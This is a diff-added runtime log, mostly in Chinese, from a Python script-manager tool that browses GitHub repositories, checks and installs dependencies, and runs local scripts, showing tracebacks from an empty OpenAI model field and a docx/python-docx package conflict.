+[2026-04-27 09:53:07] [脚本市场] README 为英文，自动翻译中...
+[2026-04-27 09:53:09] [脚本市场] AI 分析失败：No available account for model: DeepSeek-V3.2
+[2026-04-27 09:53:24] [脚本市场] README 翻译完成
+[2026-04-27 09:53:52] [脚本市场] 选中仓库：eyeblech/cinecli - CineCLI is a cross-platform command-line movie browser built with Python.
+[2026-04-27 09:53:53] [脚本市场] README 为英文，自动翻译中...
+[2026-04-27 09:53:54] [脚本市场] AI 分析失败：No available account for model: DeepSeek-V3.2
+[2026-04-27 09:54:34] [脚本市场] README 翻译完成
+[2026-04-27 09:56:15] 📄 test_local_ai.py
+[2026-04-27 09:56:15] （该脚本无头注释）
+[2026-04-27 09:56:16] ─── 脚本「test_local_ai.py」依赖检查 ───
+[2026-04-27 09:56:16] 扫描到的所有导入：openai
+[2026-04-27 09:56:16] 第三方依赖：openai
+[2026-04-27 09:56:16] 
+[2026-04-27 09:56:16]   openai: 已安装
+[2026-04-27 09:56:16] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-27 09:56:16] ─── 脚本「test_local_ai.py」依赖检查 ───
+[2026-04-27 09:56:16] 扫描到的所有导入：openai
+[2026-04-27 09:56:16] 第三方依赖：openai
+[2026-04-27 09:56:16] 
+[2026-04-27 09:56:16]   openai: 已安装
+[2026-04-27 09:56:16] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-27 09:56:16] 所有依赖已满足
+[2026-04-27 09:56:16] 所有依赖已满足
+[2026-04-27 09:56:16] 
+[2026-04-27 09:56:16] 
+[2026-04-27 09:56:16] 开始运行：test_local_ai.py
+[2026-04-27 09:56:16] 运行路径：test_local_ai.py
+[2026-04-27 09:56:16] 
+[2026-04-27 09:56:16] 开始运行：test_local_ai.py
+[2026-04-27 09:56:16] 运行路径：test_local_ai.py
+[2026-04-27 09:56:16] 
+[2026-04-27 09:56:18] Traceback (most recent call last):
+[2026-04-27 09:56:18]   File "C:\Users\ahdsz\Documents\GitHub\pymanager\data\test_local_ai.py", line 8, in <module>
+[2026-04-27 09:56:18]     response = client.chat.completions.create(
+[2026-04-27 09:56:18]         model="",
+[2026-04-27 09:56:18]     ...<2 lines>...
+[2026-04-27 09:56:18]         ]
+[2026-04-27 09:56:18]     )
+[2026-04-27 09:56:18]   File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\openai\_utils\_utils.py", line 287, in wrapper
+[2026-04-27 09:56:18]     return func(*args, **kwargs)
+[2026-04-27 09:56:18]   File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\openai\resources\chat\completions\completions.py", line 1211, in create
+[2026-04-27 09:56:18]     return self._post(
+[2026-04-27 09:56:18]            ~~~~~~~~~~^
+[2026-04-27 09:56:18]         "/chat/completions",
+[2026-04-27 09:56:18]         ^^^^^^^^^^^^^^^^^^^^
+[2026-04-27 09:56:18]     ...<47 lines>...
+[2026-04-27 09:56:18]         stream_cls=Stream[ChatCompletionChunk],
+[2026-04-27 09:56:18]         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+[2026-04-27 09:56:18]     )
+[2026-04-27 09:56:18]     ^
+[2026-04-27 09:56:18]   File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\openai\_base_client.py", line 1314, in post
+[2026-04-27 09:56:18]     return cast(ResponseT, self.request(cast_to, opts, stream=stream, stream_cls=stream_cls))
+[2026-04-27 09:56:18]                            ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+[2026-04-27 09:56:18]   File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\openai\_base_client.py", line 1087, in request
+[2026-04-27 09:56:18]     raise self._make_status_error_from_response(err.response) from None
+[2026-04-27 09:56:18] openai.BadRequestError: Error code: 400 - {'error': {'message': 'Missing required field: model', 'type': 'invalid_request_error', 'param': 'model', 'code': None}}
+[2026-04-27 09:56:18] Traceback (most recent call last):
+[2026-04-27 09:56:18]   File "C:\Users\ahdsz\Documents\GitHub\pymanager\data\test_local_ai.py", line 8, in <module>
+[2026-04-27 09:56:18]     response = client.chat.completions.create(
+[2026-04-27 09:56:18]         model="",
+[2026-04-27 09:56:18]     ...<2 lines>...
+[2026-04-27 09:56:18]         ]
+[2026-04-27 09:56:18]     )
+[2026-04-27 09:56:18]   File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\openai\_utils\_utils.py", line 287, in wrapper
+[2026-04-27 09:56:18]     return func(*args, **kwargs)
+[2026-04-27 09:56:18]   File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\openai\resources\chat\completions\completions.py", line 1211, in create
+[2026-04-27 09:56:18]     return self._post(
+[2026-04-27 09:56:18]            ~~~~~~~~~~^
+[2026-04-27 09:56:18]         "/chat/completions",
+[2026-04-27 09:56:18]         ^^^^^^^^^^^^^^^^^^^^
+[2026-04-27 09:56:18]     ...<47 lines>...
+[2026-04-27 09:56:18]         stream_cls=Stream[ChatCompletionChunk],
+[2026-04-27 09:56:18]         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+[2026-04-27 09:56:18]     )
+[2026-04-27 09:56:18]     ^
+[2026-04-27 09:56:18]   File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\openai\_base_client.py", line 1314, in post
+[2026-04-27 09:56:18]     return cast(ResponseT, self.request(cast_to, opts, stream=stream, stream_cls=stream_cls))
+[2026-04-27 09:56:18]                            ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+[2026-04-27 09:56:18]   File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\openai\_base_client.py", line 1087, in request
+[2026-04-27 09:56:18]     raise self._make_status_error_from_response(err.response) from None
+[2026-04-27 09:56:18] openai.BadRequestError: Error code: 400 - {'error': {'message': 'Missing required field: model', 'type': 'invalid_request_error', 'param': 'model', 'code': None}}
+[2026-04-27 09:56:18] 运行完成：test_local_ai.py，退出码：1
+[2026-04-27 09:56:18] 运行完成：test_local_ai.py，退出码：1
+[2026-04-27 09:59:39] [脚本市场] 搜索：python script tool
+[2026-04-27 09:59:41] [脚本市场] 找到 8683 个仓库
+[2026-04-27 10:23:45] ─── 框架依赖检查 ───
+[2026-04-27 10:23:45] 扫描完成：添加 9 个脚本，更新 0 个脚本
+[2026-04-27 10:23:45] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-27 10:23:46] [脚本市场] 搜索：python script tool
+[2026-04-27 10:23:46] [脚本市场] 网络错误：search_repos() got an unexpected keyword argument 'query'
+[2026-04-27 10:24:01] [脚本市场] 已选择本地模型：Qwen3.5-Plus
+[2026-04-27 10:24:02] [脚本市场] API Key 已保存：本地服务 (127.0.0.1:8080)
+[2026-04-27 10:24:09] [脚本市场] 搜索：python script tool
+[2026-04-27 10:24:09] [脚本市场] 网络错误：search_repos() got an unexpected keyword argument 'query'
+[2026-04-27 10:24:18] [脚本市场] 搜索：1
+[2026-04-27 10:24:18] [脚本市场] 网络错误：search_repos() got an unexpected keyword argument 'query'
+[2026-04-27 10:24:50] [脚本市场] 搜索：1
+[2026-04-27 10:24:50] [脚本市场] 网络错误：search_repos() got an unexpected keyword argument 'query'
+[2026-04-27 10:24:55] ─── 框架依赖检查 ───
+[2026-04-27 10:24:55] 扫描完成：添加 9 个脚本，更新 0 个脚本
+[2026-04-27 10:24:55] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-27 10:24:57] [脚本市场] 搜索：python script tool
+[2026-04-27 10:24:57] [脚本市场] 网络错误：search_repos() got an unexpected keyword argument 'query'
+[2026-04-27 10:27:31] ─── 框架依赖检查 ───
+[2026-04-27 10:27:31] 扫描完成：添加 9 个脚本，更新 0 个脚本
+[2026-04-27 10:27:31] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-27 10:27:33] [脚本市场] 搜索：python script tool
+[2026-04-27 10:27:35] [脚本市场] 找到 8683 个仓库
+[2026-04-27 10:27:37] [脚本市场] 选中仓库：InstaPy/InstaPy - 📷 Instagram Bot - Tool for automated Instagram interactions
+[2026-04-27 10:27:37] [脚本市场] README 加载失败：name 'get_repo_readme' is not defined
+[2026-04-27 10:28:00] [脚本市场] AI 分析完成：InstaPy/InstaPy
+[2026-04-27 10:29:39] [脚本市场] 搜索：python script tool
+[2026-04-27 10:29:41] [脚本市场] 找到 8683 个仓库
+[2026-04-27 10:29:42] [脚本市场] 选中仓库：InstaPy/InstaPy - 📷 Instagram Bot - Tool for automated Instagram interactions
+[2026-04-27 10:29:42] [脚本市场] README 加载失败：name 'get_repo_readme' is not defined
+[2026-04-27 10:29:54] ─── 框架依赖检查 ───
+[2026-04-27 10:29:54] 扫描完成：添加 9 个脚本，更新 0 个脚本
+[2026-04-27 10:29:54] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-27 10:29:55] [脚本市场] 搜索：python script tool
+[2026-04-27 10:29:58] [脚本市场] 找到 8683 个仓库
+[2026-04-27 10:29:59] [脚本市场] 选中仓库：InstaPy/InstaPy - 📷 Instagram Bot - Tool for automated Instagram interactions
+[2026-04-27 10:30:01] [脚本市场] README 为英文，自动翻译中...
+[2026-04-27 10:30:09] [脚本市场] README 翻译完成
+[2026-04-27 10:30:13] [脚本市场] 选中仓库：dashingsoft/pyarmor - A tool used to obfuscate python scripts, bind obfuscated scripts to fixed machine or expire obfuscated scripts.
+[2026-04-27 10:30:14] [脚本市场] README 为英文，自动翻译中...
+[2026-04-27 10:30:19] [脚本市场] AI 分析完成：InstaPy/InstaPy
+[2026-04-27 10:30:30] [脚本市场] README 翻译完成
+[2026-04-27 10:30:37] [脚本市场] AI 分析完成：dashingsoft/pyarmor
+[2026-04-27 10:31:14] [脚本市场] 搜索：PyArmor
+[2026-04-27 10:31:17] [脚本市场] 找到 94 个仓库
+[2026-04-27 10:31:24] [脚本市场] 选中仓库：dashingsoft/pyarmor - A tool used to obfuscate python scripts, bind obfuscated scripts to fixed machine or expire obfuscated scripts.
+[2026-04-27 10:31:25] [脚本市场] README 为英文，自动翻译中...
+[2026-04-27 10:31:40] [脚本市场] README 翻译完成
+[2026-04-27 10:31:50] [脚本市场] AI 分析完成：dashingsoft/pyarmor
+[2026-04-27 10:32:00] [脚本市场] 选中仓库：Svenskithesource/PyArmor-Unpacker - A deobfuscator for PyArmor.
+[2026-04-27 10:32:02] [脚本市场] README 为英文，自动翻译中...
+[2026-04-27 10:32:15] [脚本市场] 选中仓库：dashingsoft/pyarmor - A tool used to obfuscate python scripts, bind obfuscated scripts to fixed machine or expire obfuscated scripts.
+[2026-04-27 10:32:17] [脚本市场] README 为英文，自动翻译中...
+[2026-04-27 10:32:22] [脚本市场] AI 分析完成：Svenskithesource/PyArmor-Unpacker
+[2026-04-27 10:32:31] ─── 框架依赖检查 ───
+[2026-04-27 10:32:31] 扫描完成：添加 9 个脚本，更新 0 个脚本
+[2026-04-27 10:32:31] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-27 10:32:32] [脚本市场] 搜索：python script tool
+[2026-04-27 10:32:35] [脚本市场] 找到 8683 个仓库
+[2026-04-27 10:32:38] [脚本市场] 搜索：PyArmor
+[2026-04-27 10:32:40] [脚本市场] 找到 94 个仓库
+[2026-04-27 10:32:43] [脚本市场] 选中仓库：dashingsoft/pyarmor - A tool used to obfuscate python scripts, bind obfuscated scripts to fixed machine or expire obfuscated scripts.
+[2026-04-27 10:32:44] [脚本市场] README 为英文，自动翻译中...
+[2026-04-27 10:32:59] [脚本市场] README 翻译完成
+[2026-04-27 10:33:01] [脚本市场] AI 分析完成：dashingsoft/pyarmor
+[2026-04-27 10:33:32] [脚本市场] 选中仓库：Svenskithesource/PyArmor-Unpacker - A deobfuscator for PyArmor.
+[2026-04-27 10:33:33] [脚本市场] README 为英文，自动翻译中...
+[2026-04-27 10:33:57] [脚本市场] AI 分析完成：Svenskithesource/PyArmor-Unpacker
+[2026-04-27 10:34:02] [脚本市场] README 翻译完成
+[2026-04-27 21:25:53] ─── 框架依赖检查 ───
+[2026-04-27 21:25:53] 扫描完成：添加 9 个脚本，更新 0 个脚本
+[2026-04-27 21:25:53] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-27 21:25:56] 📄 PDF批处理工具.py
+[2026-04-27 21:25:56] ────────────────────────────────────────
+[2026-04-27 21:25:56] PDF 批处理工具 - 批量合并、拆分和转换 PDF 文件。
+
+功能：
+- 合并 PDF：将多个 PDF 文件合并为一个文件
+- 拆分 PDF：将一个 PDF 按页码范围拆分为多个文件
+- 提取页面：从 PDF 中提取指定页面
+- 添加水印：为 PDF 添加文字水印（支持自定义文字、颜色、透明度、角度）
+- 页面旋转：旋转 PDF 页面（90°/180°/270°）
+- 删除页面：删除 PDF 中的指定页面
+
+界面：
+- 左侧文件列表：支持拖拽添加文件，可调整顺序
+- 右侧操作面板：选择操作类型和参数
+- 底部输出目录：记忆上次输出目录
+- 进度条显示处理进度
+
+配置：
+- 输出目录记忆：保存到 config/pdf_tool.json
+- 水印参数记忆：上次使用的水印文字、颜色等
+
+依赖：PyMuPDF, reportlab, pypdf
+[2026-04-27 21:25:56] ─── 脚本「PDF批处理工具.py」依赖检查 ───
+[2026-04-27 21:25:56] 扫描到的所有导入：copy, fitz, json, math, os, pypdf, reportlab, sys, threading, tkinter, tkinterdnd2
+[2026-04-27 21:25:56] 第三方依赖：fitz, pypdf, reportlab, tkinterdnd2
+[2026-04-27 21:25:56] 
+[2026-04-27 21:25:56]   fitz: 已安装
+[2026-04-27 21:25:56]   pypdf: 已安装
+[2026-04-27 21:25:56]   reportlab: 已安装
+[2026-04-27 21:25:56]   tkinterdnd2: 已安装
+[2026-04-27 21:25:56] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-27 21:25:56] 所有依赖已满足
+[2026-04-27 21:25:56] 
+[2026-04-27 21:25:56] 开始运行：PDF批处理工具.py
+[2026-04-27 21:25:56] 运行路径：PDF批处理工具.py
+[2026-04-27 21:25:56] 
+[2026-04-27 21:27:23] 📄 文件夹内批量重命名.py
+[2026-04-27 21:27:23] ────────────────────────────────────────
+[2026-04-27 21:27:23] 文件夹内批量重命名 - 批量重命名指定文件夹内的文件。
+
+功能：
+- 添加前缀：在文件名前插入指定文字（如 "2024_" + "report.pdf" → "2024_report.pdf"）
+- 添加后缀：在文件名与扩展名之间插入指定文字（如 "report" + "_v2" + ".pdf" → "report_v2.pdf"）
+- 替换文字：将文件名中的指定文本替换为新文本
+- 按序号重命名：按顺序编号重命名，保留原扩展名（如 "photo_001.jpg", "photo_002.jpg"）
+
+安全机制：
+- 重命名前检查目标文件是否已存在，避免覆盖
+- 源文件不存在时自动跳过
+- 新名称与原名称相同时跳过
+- 操作前弹出确认对话框
+
+依赖：仅使用 Python 标准库（tkinter）
+[2026-04-28 20:05:00] ─── 框架依赖检查 ───
+[2026-04-28 20:05:00] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 20:05:00] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 20:05:03] 📄 报告word表格处理.py
+[2026-04-28 20:05:03] （该脚本无头注释）
+[2026-04-28 20:05:03] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:05:03] 扫描到的所有导入：无
+[2026-04-28 20:05:03] 第三方依赖：无
+[2026-04-28 20:05:03] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:05:03] 所有依赖已满足
+[2026-04-28 20:05:03] 
+[2026-04-28 20:05:03] 开始运行：报告word表格处理.py
+[2026-04-28 20:05:03] 运行路径：报告word表格处理.py
+[2026-04-28 20:05:03] 
+[2026-04-28 20:05:03] 运行完成：报告word表格处理.py，退出码：0
+[2026-04-28 20:05:10] 📄 报告word表格处理.py
+[2026-04-28 20:05:10] （该脚本无头注释）
+[2026-04-28 20:05:10] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:05:10] 扫描到的所有导入：无
+[2026-04-28 20:05:10] 第三方依赖：无
+[2026-04-28 20:05:10] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:05:10] 所有依赖已满足
+[2026-04-28 20:05:10] 
+[2026-04-28 20:05:10] 开始运行：报告word表格处理.py
+[2026-04-28 20:05:10] 运行路径：报告word表格处理.py
+[2026-04-28 20:05:10] 
+[2026-04-28 20:05:10] 运行完成：报告word表格处理.py，退出码：0
+[2026-04-28 20:05:11] 📄 报告word表格处理.py
+[2026-04-28 20:05:11] （该脚本无头注释）
+[2026-04-28 20:05:12] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:05:12] 扫描到的所有导入：无
+[2026-04-28 20:05:12] 第三方依赖：无
+[2026-04-28 20:05:12] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:05:12] 所有依赖已满足
+[2026-04-28 20:05:12] 
+[2026-04-28 20:05:12] 依赖检查完成：报告word表格处理.py 所有依赖已满足
+[2026-04-28 20:06:15] 📄 报告word表格处理.py
+[2026-04-28 20:06:15] （该脚本无头注释）
+[2026-04-28 20:06:16] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:06:16] 扫描到的所有导入：无
+[2026-04-28 20:06:16] 第三方依赖：无
+[2026-04-28 20:06:16] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:06:16] 所有依赖已满足
+[2026-04-28 20:06:16] 
+[2026-04-28 20:06:16] 开始运行：报告word表格处理.py
+[2026-04-28 20:06:16] 运行路径：报告word表格处理.py
+[2026-04-28 20:06:16] 
+[2026-04-28 20:06:16] 运行完成：报告word表格处理.py，退出码：0
+[2026-04-28 20:06:44] 📄 报告word表格处理.py
+[2026-04-28 20:06:44] （该脚本无头注释）
+[2026-04-28 20:06:44] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:06:44] 扫描到的所有导入：无
+[2026-04-28 20:06:44] 第三方依赖：无
+[2026-04-28 20:06:44] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:06:44] 所有依赖已满足
+[2026-04-28 20:06:44] 
+[2026-04-28 20:06:44] 开始运行：报告word表格处理.py
+[2026-04-28 20:06:44] 运行路径：报告word表格处理.py
+[2026-04-28 20:06:44] 
+[2026-04-28 20:06:44] 运行完成：报告word表格处理.py，退出码：0
+[2026-04-28 20:11:43] ─── 框架依赖检查 ───
+[2026-04-28 20:11:43] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 20:11:44] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 20:11:46] 📄 报告word表格处理.py
+[2026-04-28 20:11:46] （该脚本无头注释）
+[2026-04-28 20:11:47] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:11:47] 扫描到的所有导入：docx, os, re, shlex, threading, tkinter, tkinterdnd2
+[2026-04-28 20:11:47] 第三方依赖：docx, tkinterdnd2
+[2026-04-28 20:11:47] 
+[2026-04-28 20:11:47]   docx: 未安装
+[2026-04-28 20:11:47]   tkinterdnd2: 已安装
+[2026-04-28 20:11:47] 
+缺少直接依赖：docx
+[2026-04-28 20:11:47] 脚本「报告word表格处理.py」缺少以下依赖： docx 是否立即安装？（将使用加速镜像源）
+[2026-04-28 20:11:49] 开始安装依赖: docx
+[2026-04-28 20:11:49] 尝试源 1/4: pypi.tuna.tsinghua.edu.cn
+[2026-04-28 20:11:50] Looking in indexes: https://pypi.tuna.tsinghua.edu.cn/simple
+[2026-04-28 20:11:50] Collecting docx
+[2026-04-28 20:11:51] Downloading https://pypi.tuna.tsinghua.edu.cn/packages/4a/8e/5a01644697b03016de339ef444cfff28367f92984dc74eddaab1ed60eada/docx-0.2.4.tar.gz (54 kB)
+[2026-04-28 20:11:51] Installing build dependencies: started
+[2026-04-28 20:11:54] Installing build dependencies: finished with status 'done'
+[2026-04-28 20:11:54] Getting requirements to build wheel: started
+[2026-04-28 20:11:55] Getting requirements to build wheel: finished with status 'done'
+[2026-04-28 20:11:55] Preparing metadata (pyproject.toml): started
+[2026-04-28 20:11:55] Preparing metadata (pyproject.toml): finished with status 'done'
+[2026-04-28 20:11:55] Requirement already satisfied: lxml in C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages (from docx) (6.1.0)
+[2026-04-28 20:11:55] Requirement already satisfied: Pillow>=2.0 in C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages (from docx) (12.2.0)
+[2026-04-28 20:11:55] Building wheels for collected packages: docx
+[2026-04-28 20:11:55] Building wheel for docx (pyproject.toml): started
+[2026-04-28 20:11:56] Building wheel for docx (pyproject.toml): finished with status 'done'
+[2026-04-28 20:11:56] Created wheel for docx: filename=docx-0.2.4-py3-none-any.whl size=54012 sha256=537a7c21d75ddc4c79794b66b0370a4f20c2928695808c900bdab51bd61e041b
+[2026-04-28 20:11:56] Stored in directory: c:\users\ahdsz\appdata\local\pip\cache\wheels\a4\73\1b\b87cdcc83947bbb376cb39ad37af011e926490f23da97e3a2e
+[2026-04-28 20:11:56] Successfully built docx
+[2026-04-28 20:11:56] Installing collected packages: docx
+[2026-04-28 20:11:56] Successfully installed docx-0.2.4
+[2026-04-28 20:11:56] 成功安装包: docx (源: https://pypi.tuna.tsinghua.edu.cn/simple)
+[2026-04-28 20:11:56] 依赖检查完成：报告word表格处理.py 仍缺少部分依赖
+[2026-04-28 20:12:02] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:12:02] 扫描到的所有导入：docx, os, re, shlex, threading, tkinter, tkinterdnd2
+[2026-04-28 20:12:02] 第三方依赖：docx, tkinterdnd2
+[2026-04-28 20:12:02] 
+[2026-04-28 20:12:02]   docx: 已安装
+[2026-04-28 20:12:02]   tkinterdnd2: 已安装
+[2026-04-28 20:12:02] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:12:02] 所有依赖已满足
+[2026-04-28 20:12:02] 
+[2026-04-28 20:12:02] 依赖检查完成：报告word表格处理.py 所有依赖已满足
+[2026-04-28 20:12:05] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:12:05] 扫描到的所有导入：docx, os, re, shlex, threading, tkinter, tkinterdnd2
+[2026-04-28 20:12:05] 第三方依赖：docx, tkinterdnd2
+[2026-04-28 20:12:05] 
+[2026-04-28 20:12:05]   docx: 已安装
+[2026-04-28 20:12:05]   tkinterdnd2: 已安装
+[2026-04-28 20:12:05] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:12:05] 所有依赖已满足
+[2026-04-28 20:12:05] 
+[2026-04-28 20:12:05] 依赖检查完成：报告word表格处理.py 所有依赖已满足
+[2026-04-28 20:12:05] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:12:05] 扫描到的所有导入：docx, os, re, shlex, threading, tkinter, tkinterdnd2
+[2026-04-28 20:12:05] 第三方依赖：docx, tkinterdnd2
+[2026-04-28 20:12:05] 
+[2026-04-28 20:12:05]   docx: 已安装
+[2026-04-28 20:12:05]   tkinterdnd2: 已安装
+[2026-04-28 20:12:05] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:12:05] 所有依赖已满足
+[2026-04-28 20:12:05] 
+[2026-04-28 20:12:05] 依赖检查完成：报告word表格处理.py 所有依赖已满足
+[2026-04-28 20:12:06] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:12:06] 扫描到的所有导入：docx, os, re, shlex, threading, tkinter, tkinterdnd2
+[2026-04-28 20:12:06] 第三方依赖：docx, tkinterdnd2
+[2026-04-28 20:12:06] 
+[2026-04-28 20:12:06]   docx: 已安装
+[2026-04-28 20:12:06]   tkinterdnd2: 已安装
+[2026-04-28 20:12:06] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:12:06] 所有依赖已满足
+[2026-04-28 20:12:06] 
+[2026-04-28 20:12:06] 依赖检查完成：报告word表格处理.py 所有依赖已满足
+[2026-04-28 20:12:07] 📄 报告word表格处理.py
+[2026-04-28 20:12:07] （该脚本无头注释）
+[2026-04-28 20:12:07] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:12:07] 扫描到的所有导入：docx, os, re, shlex, threading, tkinter, tkinterdnd2
+[2026-04-28 20:12:07] 第三方依赖：docx, tkinterdnd2
+[2026-04-28 20:12:07] 
+[2026-04-28 20:12:07]   docx: 已安装
+[2026-04-28 20:12:07]   tkinterdnd2: 已安装
+[2026-04-28 20:12:07] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:12:07] 所有依赖已满足
+[2026-04-28 20:12:07] 
+[2026-04-28 20:12:07] 开始运行：报告word表格处理.py
+[2026-04-28 20:12:07] 运行路径：报告word表格处理.py
+[2026-04-28 20:12:07] 
+[2026-04-28 20:12:07] Traceback (most recent call last):
+[2026-04-28 20:12:07]   File "C:\Users\ahdsz\Documents\GitHub\pymanager\data\报告word表格处理.py", line 7, in <module>
+[2026-04-28 20:12:07]     from docx import Document
+[2026-04-28 20:12:07] ImportError: cannot import name 'Document' from 'docx' (C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx.py). Did you mean: 'newdocument'?
+[2026-04-28 20:12:07] 运行完成：报告word表格处理.py，退出码：1
+[2026-04-28 20:12:19] 📄 报告word表格处理.py
+[2026-04-28 20:12:19] （该脚本无头注释）
+[2026-04-28 20:12:19] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:12:19] 扫描到的所有导入：docx, os, re, shlex, threading, tkinter, tkinterdnd2
+[2026-04-28 20:12:19] 第三方依赖：docx, tkinterdnd2
+[2026-04-28 20:12:19] 
+[2026-04-28 20:12:19]   docx: 已安装
+[2026-04-28 20:12:19]   tkinterdnd2: 已安装
+[2026-04-28 20:12:19] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:12:19] 所有依赖已满足
+[2026-04-28 20:12:19] 
+[2026-04-28 20:12:19] 开始运行：报告word表格处理.py
+[2026-04-28 20:12:19] 运行路径：报告word表格处理.py
+[2026-04-28 20:12:19] 
+[2026-04-28 20:12:19] Traceback (most recent call last):
+[2026-04-28 20:12:19]   File "C:\Users\ahdsz\Documents\GitHub\pymanager\data\报告word表格处理.py", line 7, in <module>
+[2026-04-28 20:12:19]     from docx import Document
+[2026-04-28 20:12:19] ImportError: cannot import name 'Document' from 'docx' (C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx.py). Did you mean: 'newdocument'?
+[2026-04-28 20:12:19] 运行完成：报告word表格处理.py，退出码：1
+[2026-04-28 20:13:32] [脚本市场] 搜索：python script tool
+[2026-04-28 20:13:35] [脚本市场] 找到 8704 个仓库
+[2026-04-28 20:13:37] [脚本市场] 选中仓库：InstaPy/InstaPy - 📷 Instagram Bot - Tool for automated Instagram interactions
+[2026-04-28 20:13:37] [脚本市场] README 为英文，自动翻译中...
+[2026-04-28 20:13:41] [脚本市场] AI 网络错误：[WinError 10061] 由于目标计算机积极拒绝，无法连接。
+[2026-04-28 20:14:00] [脚本市场] README 翻译完成
+[2026-04-28 20:15:07] ─── 框架依赖检查 ───
+[2026-04-28 20:15:07] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 20:15:07] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 20:15:09] 📄 报告word表格处理.py
+[2026-04-28 20:15:09] （该脚本无头注释）
+[2026-04-28 20:15:10] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:15:10] 扫描到的所有导入：docx, os, re, shlex, threading, tkinter, tkinterdnd2
+[2026-04-28 20:15:10] 第三方依赖：docx, tkinterdnd2
+[2026-04-28 20:15:10] 
+[2026-04-28 20:15:10]   docx: 已安装
+[2026-04-28 20:15:10]   tkinterdnd2: 已安装
+[2026-04-28 20:15:10] 
+缺少直接依赖：python-docx
+[2026-04-28 20:15:10] 脚本「报告word表格处理.py」缺少以下依赖： python-docx 是否立即安装？（将使用加速镜像源）
+[2026-04-28 20:15:12] [包冲突] 旧版 docx 包不兼容 Python 3，需要替换为 python-docx
+[2026-04-28 20:15:12] [包冲突] 正在卸载旧版 docx 并安装 python-docx...
+[2026-04-28 20:15:13] 开始安装依赖: python-docx
+[2026-04-28 20:15:13] 尝试源 1/4: pypi.tuna.tsinghua.edu.cn
+[2026-04-28 20:15:14] Looking in indexes: https://pypi.tuna.tsinghua.edu.cn/simple
+[2026-04-28 20:15:15] Collecting python-docx
+[2026-04-28 20:15:15] Downloading https://pypi.tuna.tsinghua.edu.cn/packages/d0/00/1e03a4989fa5795da308cd774f05b704ace555a70f9bf9d3be057b680bcf/python_docx-1.2.0-py3-none-any.whl (252 kB)
+[2026-04-28 20:15:15] Requirement already satisfied: lxml>=3.1.0 in C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages (from python-docx) (6.1.0)
+[2026-04-28 20:15:15] Requirement already satisfied: typing_extensions>=4.9.0 in C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages (from python-docx) (4.15.0)
+[2026-04-28 20:15:16] Installing collected packages: python-docx
+[2026-04-28 20:15:17] Successfully installed python-docx-1.2.0
+[2026-04-28 20:15:17] 成功安装包: python-docx (源: https://pypi.tuna.tsinghua.edu.cn/simple)
+[2026-04-28 20:15:17] [包冲突] 已替换为 python-docx
+[2026-04-28 20:15:17] 依赖检查完成：报告word表格处理.py 仍缺少部分依赖
+[2026-04-28 20:15:19] ─── 脚本「报告word表格处理.py」依赖检查 ───
